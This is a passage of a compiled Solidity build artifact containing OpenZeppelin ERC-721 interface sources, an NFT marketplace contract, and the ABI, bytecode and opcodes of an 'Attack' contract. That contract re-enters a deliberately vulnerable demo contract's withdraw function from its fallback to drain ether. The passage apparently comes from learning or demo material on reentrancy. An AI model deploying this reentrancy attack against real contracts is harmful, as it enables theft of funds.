Requirements:\\n     *\\n     * - `tokenId` must exist.\\n     */\\n    function ownerOf(uint256 tokenId) external view returns (address owner);\\n\\n    /**\\n     * @dev Safely transfers `tokenId` token from `from` to `to`.\\n     *\\n     * Requirements:\\n     *\\n     * - `from` cannot be the zero address.\\n     * - `to` cannot be the zero address.\\n     * - `tokenId` token must exist and be owned by `from`.\\n     * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.\\n     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function safeTransferFrom(\\n        address from,\\n        address to,\\n        uint256 tokenId,\\n        bytes calldata data\\n    ) external;\\n\\n    /**\\n     * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients\\n     * are aware of the ERC721 protocol to prevent tokens from being forever locked.\\n     *\\n     * Requirements:\\n     *\\n     * - `from` cannot be the zero address.\\n     * - `to` cannot be the zero address.\\n     * - `tokenId` token must exist and be owned by `from`.\\n     * - If the caller is not `from`, it must have been allowed to move this token by either {approve} or {setApprovalForAll}.\\n     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function safeTransferFrom(\\n        address from,\\n        address to,\\n        uint256 tokenId\\n    ) external;\\n\\n    /**\\n     * @dev Transfers `tokenId` token from `from` to `to`.\\n     *\\n     * WARNING: Note that the caller is responsible to confirm that the recipient is capable of receiving ERC721\\n     * or else they may be permanently lost. Usage of {safeTransferFrom} prevents loss, though the caller must\\n     * understand this adds an external call which potentially creates a reentrancy vulnerability.\\n     *\\n     * Requirements:\\n     *\\n     * - `from` cannot be the zero address.\\n     * - `to` cannot be the zero address.\\n     * - `tokenId` token must be owned by `from`.\\n     * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transferFrom(\\n        address from,\\n        address to,\\n        uint256 tokenId\\n    ) external;\\n\\n    /**\\n     * @dev Gives permission to `to` to transfer `tokenId` token to another account.\\n     * The approval is cleared when the token is transferred.\\n     *\\n     * Only a single account can be approved at a time, so approving the zero address clears previous approvals.\\n     *\\n     * Requirements:\\n     *\\n     * - The caller must own the token or be an approved operator.\\n     * - `tokenId` must exist.\\n     *\\n     * Emits an {Approval} event.\\n     */\\n    function approve(address to, uint256 tokenId) external;\\n\\n    /**\\n     * @dev Approve or remove `operator` as an operator for the caller.\\n     * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.\\n     *\\n     * Requirements:\\n     *\\n     * - The `operator` cannot be the caller.\\n     *\\n     * Emits an {ApprovalForAll} event.\\n     */\\n    function setApprovalForAll(address operator, bool _approved) external;\\n\\n    /**\\n     * @dev Returns the account approved for `tokenId` token.\\n     *\\n     * Requirements:\\n     *\\n     * - `tokenId` must exist.\\n     */\\n    function getApproved(uint256 tokenId) external view returns (address operator);\\n\\n    /**\\n     * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.\\n     *\\n     * See {setApprovalForAll}\\n     */\\n    function isApprovedForAll(address owner, address operator) external view returns (bool);\\n}\\n\",\"keccak256\":\"0xab28a56179c1db258c9bf5235b382698cb650debecb51b23d12be9e241374b68\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/introspection/IERC165.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)\\n\\npragma solidity ^0.8.0;\\n\\n/**\\n * @dev Interface of the ERC165 standard, as defined in the\\n * https://eips.ethereum.org/EIPS/eip-165[EIP].\\n *\\n * Implementers can declare support of contract interfaces, which can then be\\n * queried by others ({ERC165Checker}).\\n *\\n * For an implementation, see {ERC165}.\\n */\\ninterface IERC165 {\\n    /**\\n     * @dev Returns true if this contract implements the interface defined by\\n     * `interfaceId`. See the corresponding\\n     * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]\\n     * to learn more about how these ids are created.\\n     *\\n     * This function call must use less than 30 000 gas.\\n     */\\n    function supportsInterface(bytes4 interfaceId) external view returns (bool);\\n}\\n\",\"keccak256\":\"0x447a5f3ddc18419d41ff92b3773fb86471b1db25773e07f877f548918a185bf1\",\"license\":\"MIT\"},\"contracts/NftMarketplace.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.7;\\nimport \\\"@openzeppelin/contracts/token/ERC721/IERC721.sol\\\";\\nimport \\\"@openzeppelin/contracts/security/ReentrancyGuard.sol\\\";\\n\\nerror PriceNotMet(address nftAddress, uint256 tokenId, uint256 price);\\nerror ItemNotForSale(address nftAddress, uint256 tokenId);\\nerror NotListed(address nftAddress, uint256 tokenId);\\nerror AlreadyListed(address nftAddress, uint256 tokenId);\\nerror NoProceeds();\\nerror NotOwner();\\nerror NotApprovedForMarketplace();\\nerror PriceMustBeAboveZero();\\n\\ncontract NftMarketplace is ReentrancyGuard {\\n    struct Listing {\\n        uint256 price;\\n        address seller;\\n    }\\n    event ItemListed(\\n        address indexed seller,\\n        address indexed nftAddress,\\n        uint256 indexed tokenId,\\n        uint256 price\\n    );\\n    event ItemCanceled(\\n        address indexed seller,\\n        address indexed nftAddress,\\n        uint256 indexed tokenId\\n    );\\n    event ItemBought(\\n        address indexed seller,\\n        address indexed nftAddress,\\n        uint256 indexed tokenId,\\n        uint256 price\\n    );\\n    mapping(address => mapping(uint256 => Listing)) private s_listings;\\n    mapping(address => uint256) private s_proceeds;\\n    modifier notListed(address nftAddress, uint256 tokenId) {\\n        Listing memory listing = s_listings[nftAddress][tokenId];\\n        if (listing.price > 0) {\\n            revert AlreadyListed(nftAddress, tokenId);\\n        }\\n        _;\\n    }\\n    modifier isListed(address nftAddress, uint256 tokenId) {\\n        Listing memory listing = s_listings[nftAddress][tokenId];\\n        if (listing.price <= 0) {\\n            revert NotListed(nftAddress, tokenId);\\n        }\\n        _;\\n    }\\n    modifier isOwner(\\n        address nftAddress,\\n        uint256 tokenId,\\n        address spender\\n    ) {\\n        IERC721 nft = IERC721(nftAddress);\\n        address owner = nft.ownerOf(tokenId);\\n        if (spender != owner) {\\n            revert NotOwner();\\n        }\\n        _;\\n    }\\n\\n    function listItem(\\n        address nftAddress,\\n        uint256 tokenId,\\n        uint256 price\\n    )\\n        external\\n        notListed(nftAddress, tokenId)\\n        isOwner(nftAddress, tokenId, msg.sender)\\n    {\\n        if (price <= 0) {\\n            revert PriceMustBeAboveZero();\\n        }\\n        IERC721 nft = IERC721(nftAddress);\\n        if (nft.getApproved(tokenId) != address(this)) {\\n            revert NotApprovedForMarketplace();\\n        }\\n        s_listings[nftAddress][tokenId] = Listing(price, msg.sender);\\n        emit ItemListed(msg.sender, nftAddress, tokenId, price);\\n    }\\n\\n    function cancelListing(\\n        address nftAddress,\\n        uint256 tokenId\\n    )\\n        external\\n        isOwner(nftAddress, tokenId, msg.sender)\\n        isListed(nftAddress, tokenId)\\n    {\\n        delete (s_listings[nftAddress][tokenId]);\\n        emit ItemCanceled(msg.sender, nftAddress, tokenId);\\n    }\\n\\n    function buyItem(\\n        address nftAddress,\\n        uint256 tokenId\\n    ) external payable isListed(nftAddress, tokenId) nonReentrant {\\n        Listing memory listedItem = s_listings[nftAddress][tokenId];\\n        if (msg.value < listedItem.price) {\\n            revert PriceNotMet(nftAddress, tokenId, listedItem.price);\\n        }\\n        s_proceeds[listedItem.seller] += msg.value;\\n        delete (s_listings[nftAddress][tokenId]);\\n        IERC721(nftAddress).safeTransferFrom(\\n            listedItem.seller,\\n            msg.sender,\\n            tokenId\\n        );\\n        emit ItemBought(msg.sender, nftAddress, tokenId, listedItem.price);\\n    }\\n\\n    function updateListing(\\n        address nftAddress,\\n        uint256 tokenId,\\n        uint256 newPrice\\n    )\\n        external\\n        isListed(nftAddress, tokenId)\\n        nonReentrant\\n        isOwner(nftAddress, tokenId, msg.sender)\\n    {\\n        if (newPrice <= 0) {\\n            revert PriceMustBeAboveZero();\\n        }\\n        s_listings[nftAddress][tokenId].price = newPrice;\\n        emit ItemListed(msg.sender, nftAddress, tokenId, newPrice);\\n    }\\n\\n    function withdrawProceeds() external {\\n        uint256 proceeds = s_proceeds[msg.sender];\\n        if (proceeds <= 0) {\\n            revert NoProceeds();\\n        }\\n        s_proceeds[msg.sender] = 0;\\n        (bool success, ) = payable(msg.sender).call{value: proceeds}(\\\"\\\");\\n        require(success, \\\"Transfer failed\\\");\\n    }\\n\\n    function getListing(\\n        address nftAddress,\\n        uint256 tokenId\\n    ) external view returns (Listing memory) {\\n        return s_listings[nftAddress][tokenId];\\n    }\\n\\n    function getProceeds(address seller) external view returns (uint256) {\\n        return s_proceeds[seller];\\n    }\\n}\\n\",\"keccak256\":\"0xb04d3005e637bf50fa8f1eac3bbc663bba8d274089245447206218738ac42195\",\"license\":\"MIT\"}},\"version\":1}","storageLayout":{"storage":[{"astId":10,"contract":"contracts/NftMarketplace.sol:NftMarketplace","label":"_status","offset":0,"slot":"0","type":"t_uint256"},{"astId":2667,"contract":"contracts/NftMarketplace.sol:NftMarketplace","label":"s_listings","offset":0,"slot":"1","type":"t_mapping(t_address,t_mapping(t_uint256,t_struct(Listing)2632_storage))"},{"astId":2671,"contract":"contracts/NftMarketplace.sol:NftMarketplace","label":"s_proceeds","offset":0,"slot":"2","type":"t_mapping(t_address,t_uint256)"}],"types":{"t_address":{"encoding":"inplace","label":"address","numberOfBytes":"20"},"t_mapping(t_address,t_mapping(t_uint256,t_struct(Listing)2632_storage))":{"encoding":"mapping","key":"t_address","label":"mapping(address => mapping(uint256 => struct NftMarketplace.Listing))","numberOfBytes":"32","value":"t_mapping(t_uint256,t_struct(Listing)2632_storage)"},"t_mapping(t_address,t_uint256)":{"encoding":"mapping","key":"t_address","label":"mapping(address => uint256)","numberOfBytes":"32","value":"t_uint256"},"t_mapping(t_uint256,t_struct(Listing)2632_storage)":{"encoding":"mapping","key":"t_uint256","label":"mapping(uint256 => struct NftMarketplace.Listing)","numberOfBytes":"32","value":"t_struct(Listing)2632_storage"},"t_struct(Listing)2632_storage":{"encoding":"inplace","label":"struct NftMarketplace.Listing","members":[{"astId":2629,"contract":"contracts/NftMarketplace.sol:NftMarketplace","label":"price","offset":0,"slot":"0","type":"t_uint256"},{"astId":2631,"contract":"contracts/NftMarketplace.sol:NftMarketplace","label":"seller","offset":0,"slot":"1","type":"t_address"}],"numberOfBytes":"64"},"t_uint256":{"encoding":"inplace","label":"uint256","numberOfBytes":"32"}}},"userdoc":{"kind":"user","methods":{},"version":1}}},"contracts/sub/ReentrantVulnerable.sol":{"Attack":{"abi":[{"inputs":[{"internalType":"address","name":"_reentrantVulnerable","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"stateMutability":"payable","type":"fallback"},{"inputs":[],"name":"attack","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"getBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"reentrantVulnerable","outputs":[{"internalType":"contract ReentrantVulnerable","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"stateMutability":"payable","type":"receive"}],"devdoc":{"kind":"dev","methods":{},"version":1},"evm":{"bytecode":{"functionDebugData":{"@_3133":{"entryPoint":null,"id":3133,"parameterSlots":1,"returnSlots":0},"abi_decode_t_address_fromMemory":{"entryPoint":120,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_tuple_t_address_fromMemory":{"entryPoint":141,"id":null,"parameterSlots":2,"returnSlots":1},"allocate_unbounded":{"entryPoint":null,"id":null,"parameterSlots":0,"returnSlots":1},"cleanup_t_address":{"entryPoint":186,"id":null,"parameterSlots":1,"returnSlots":1},"cleanup_t_uint160":{"entryPoint":204,"id":null,"parameterSlots":1,"returnSlots":1},"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db":{"entryPoint":null,"id":null,"parameterSlots":0,"returnSlots":0},"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b":{"entryPoint":236,"id":null,"parameterSlots":0,"returnSlots":0},"validator_revert_t_address":{"entryPoint":241,"id":null,"parameterSlots":1,"returnSlots":0}},"generatedSources":[{"ast":{"nodeType":"YulBlock","src":"0:1199:15","statements":[{"body":{"nodeType":"YulBlock","src":"70:80:15","statements":[{"nodeType":"YulAssignment","src":"80:22:15","value":{"arguments":[{"name":"offset","nodeType":"YulIdentifier","src":"95:6:15"}],"functionName":{"name":"mload","nodeType":"YulIdentifier","src":"89:5:15"},"nodeType":"YulFunctionCall","src":"89:13:15"},"variableNames":[{"name":"value","nodeType":"YulIdentifier","src":"80:5:15"}]},{"expression":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"138:5:15"}],"functionName":{"name":"validator_revert_t_address","nodeType":"YulIdentifier","src":"111:26:15"},"nodeType":"YulFunctionCall","src":"111:33:15"},"nodeType":"YulExpressionStatement","src":"111:33:15"}]},"name":"abi_decode_t_address_fromMemory","nodeType":"YulFunctionDefinition","parameters":[{"name":"offset","nodeType":"YulTypedName","src":"48:6:15","type":""},{"name":"end","nodeType":"YulTypedName","src":"56:3:15","type":""}],"returnVariables":[{"name":"value","nodeType":"YulTypedName","src":"64:5:15","type":""}],"src":"7:143:15"},{"body":{"nodeType":"YulBlock","src":"233:274:15","statements":[{"body":{"nodeType":"YulBlock","src":"279:83:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nodeType":"YulIdentifier","src":"281:77:15"},"nodeType":"YulFunctionCall","src":"281:79:15"},"nodeType":"YulExpressionStatement","src":"281:79:15"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nodeType":"YulIdentifier","src":"254:7:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"263:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"250:3:15"},"nodeType":"YulFunctionCall","src":"250:23:15"},{"kind":"number","nodeType":"YulLiteral","src":"275:2:15","type":"","value":"32"}],"functionName":{"name":"slt","nodeType":"YulIdentifier","src":"246:3:15"},"nodeType":"YulFunctionCall","src":"246:32:15"},"nodeType":"YulIf","src":"243:119:15"},{"nodeType":"YulBlock","src":"372:128:15","statements":[{"nodeType":"YulVariableDeclaration","src":"387:15:15","value":{"kind":"number","nodeType":"YulLiteral","src":"401:1:15","type":"","value":"0"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"391:6:15","type":""}]},{"nodeType":"YulAssignment","src":"416:74:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"462:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"473:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"458:3:15"},"nodeType":"YulFunctionCall","src":"458:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"482:7:15"}],"functionName":{"name":"abi_decode_t_address_fromMemory","nodeType":"YulIdentifier","src":"426:31:15"},"nodeType":"YulFunctionCall","src":"426:64:15"},"variableNames":[{"name":"value0","nodeType":"YulIdentifier","src":"416:6:15"}]}]}]},"name":"abi_decode_tuple_t_address_fromMemory","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"203:9:15","type":""},{"name":"dataEnd","nodeType":"YulTypedName","src":"214:7:15","type":""}],"returnVariables":[{"name":"value0","nodeType":"YulTypedName","src":"226:6:15","type":""}],"src":"156:351:15"},{"body":{"nodeType":"YulBlock","src":"553:35:15","statements":[{"nodeType":"YulAssignment","src":"563:19:15","value":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"579:2:15","type":"","value":"64"}],"functionName":{"name":"mload","nodeType":"YulIdentifier","src":"573:5:15"},"nodeType":"YulFunctionCall","src":"573:9:15"},"variableNames":[{"name":"memPtr","nodeType":"YulIdentifier","src":"563:6:15"}]}]},"name":"allocate_unbounded","nodeType":"YulFunctionDefinition","returnVariables":[{"name":"memPtr","nodeType":"YulTypedName","src":"546:6:15","type":""}],"src":"513:75:15"},{"body":{"nodeType":"YulBlock","src":"639:51:15","statements":[{"nodeType":"YulAssignment","src":"649:35:15","value":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"678:5:15"}],"functionName":{"name":"cleanup_t_uint160","nodeType":"YulIdentifier","src":"660:17:15"},"nodeType":"YulFunctionCall","src":"660:24:15"},"variableNames":[{"name":"cleaned","nodeType":"YulIdentifier","src":"649:7:15"}]}]},"name":"cleanup_t_address","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"621:5:15","type":""}],"returnVariables":[{"name":"cleaned","nodeType":"YulTypedName","src":"631:7:15","type":""}],"src":"594:96:15"},{"body":{"nodeType":"YulBlock","src":"741:81:15","statements":[{"nodeType":"YulAssignment","src":"751:65:15","value":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"766:5:15"},{"kind":"number","nodeType":"YulLiteral","src":"773:42:15","type":"","value":"0xffffffffffffffffffffffffffffffffffffffff"}],"functionName":{"name":"and","nodeType":"YulIdentifier","src":"762:3:15"},"nodeType":"YulFunctionCall","src":"762:54:15"},"variableNames":[{"name":"cleaned","nodeType":"YulIdentifier","src":"751:7:15"}]}]},"name":"cleanup_t_uint160","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"723:5:15","type":""}],"returnVariables":[{"name":"cleaned","nodeType":"YulTypedName","src":"733:7:15","type":""}],"src":"696:126:15"},{"body":{"nodeType":"YulBlock","src":"917:28:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"934:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"937:1:15","type":"","value":"0"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"927:6:15"},"nodeType":"YulFunctionCall","src":"927:12:15"},"nodeType":"YulExpressionStatement","src":"927:12:15"}]},"name":"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db","nodeType":"YulFunctionDefinition","src":"828:117:15"},{"body":{"nodeType":"YulBlock","src":"1040:28:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"1057:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"1060:1:15","type":"","value":"0"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"1050:6:15"},"nodeType":"YulFunctionCall","src":"1050:12:15"},"nodeType":"YulExpressionStatement","src":"1050:12:15"}]},"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nodeType":"YulFunctionDefinition","src":"951:117:15"},{"body":{"nodeType":"YulBlock","src":"1117:79:15","statements":[{"body":{"nodeType":"YulBlock","src":"1174:16:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"1183:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"1186:1:15","type":"","value":"0"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"1176:6:15"},"nodeType":"YulFunctionCall","src":"1176:12:15"},"nodeType":"YulExpressionStatement","src":"1176:12:15"}]},"condition":{"arguments":[{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"1140:5:15"},{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"1165:5:15"}],"functionName":{"name":"cleanup_t_address","nodeType":"YulIdentifier","src":"1147:17:15"},"nodeType":"YulFunctionCall","src":"1147:24:15"}],"functionName":{"name":"eq","nodeType":"YulIdentifier","src":"1137:2:15"},"nodeType":"YulFunctionCall","src":"1137:35:15"}],"functionName":{"name":"iszero","nodeType":"YulIdentifier","src":"1130:6:15"},"nodeType":"YulFunctionCall","src":"1130:43:15"},"nodeType":"YulIf","src":"1127:63:15"}]},"name":"validator_revert_t_address","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"1110:5:15","type":""}],"src":"1074:122:15"}]},"contents":"{\n\n    function abi_decode_t_address_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_address(value)\n    }\n\n    function abi_decode_tuple_t_address_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function validator_revert_t_address(value) {\n        if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }\n    }\n\n}\n","id":15,"language":"Yul","name":"#utility.yul"}],"linkReferences":{},"object":"608060405234801561001057600080fd5b5060405161056b38038061056b8339818101604052810190610032919061008d565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610108565b600081519050610087816100f1565b92915050565b6000602082840312156100a3576100a26100ec565b5b60006100b184828501610078565b91505092915050565b60006100c5826100cc565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600080fd5b6100fa816100ba565b811461010557600080fd5b50565b610454806101176000396000f3fe6080604052600436106100385760003560e01c806312065fe01461014157806333684a051461016c5780639e5faafc1461019757610078565b36610078576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161006f90610349565b60405180910390fd5b670de0b6b3a764000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16311061013f5760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561012657600080fd5b505af115801561013a573d6000803e3d6000fd5b505050505b005b34801561014d57600080fd5b506101566101a1565b6040516101639190610369565b60405180910390f35b34801561017857600080fd5b506101816101a9565b60405161018e919061032e565b60405180910390f35b61019f6101cd565b005b600047905090565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b670de0b6b3a76400003410156101e257600080fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561025257600080fd5b505af1158015610266573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156102d357600080fd5b505af11580156102e7573d6000803e3d6000fd5b50505050565b6102f6816103bf565b82525050565b6000610309600d83610384565b9150610314826103f5565b602082019050919050565b610328816103b5565b82525050565b600060208201905061034360008301846102ed565b92915050565b60006020820190508181036000830152610362816102fc565b9050919050565b600060208201905061037e600083018461031f565b92915050565b600082825260208201905092915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006103ca826103d1565b9050919050565b60006103dc826103e3565b9050919050565b60006103ee82610395565b9050919050565b7f6920676f74206e6f20696465610000000000000000000000000000000000000060008201525056fea26469706673582212206f7669702ea4a58d060acb74cff23915c6ffb74eca2b42940bfa152a3a626b5c64736f6c63430008070033","opcodes":"PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x56B CODESIZE SUB DUP1 PUSH2 0x56B DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x32 SWAP2 SWAP1 PUSH2 0x8D JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x108 JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x87 DUP2 PUSH2 0xF1 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xA3 JUMPI PUSH2 0xA2 PUSH2 0xEC JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0xB1 DUP5 DUP3 DUP6 ADD PUSH2 0x78 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xC5 DUP3 PUSH2 0xCC JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xFA DUP2 PUSH2 0xBA JUMP JUMPDEST DUP2 EQ PUSH2 0x105 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH2 0x454 DUP1 PUSH2 0x117 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x38 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x12065FE0 EQ PUSH2 0x141 JUMPI DUP1 PUSH4 0x33684A05 EQ PUSH2 0x16C JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x197 JUMPI PUSH2 0x78 JUMP JUMPDEST CALLDATASIZE PUSH2 0x78 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x6F SWAP1 PUSH2 0x349 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH8 0xDE0B6B3A7640000 PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE LT PUSH2 0x13F JUMPI PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x126 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x13A JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x14D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x156 PUSH2 0x1A1 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x163 SWAP2 SWAP1 PUSH2 0x369 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x178 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x181 PUSH2 0x1A9 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x18E SWAP2 SWAP1 PUSH2 0x32E JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x19F PUSH2 0x1CD JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 SELFBALANCE SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH8 0xDE0B6B3A7640000 CALLVALUE LT ISZERO PUSH2 0x1E2 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 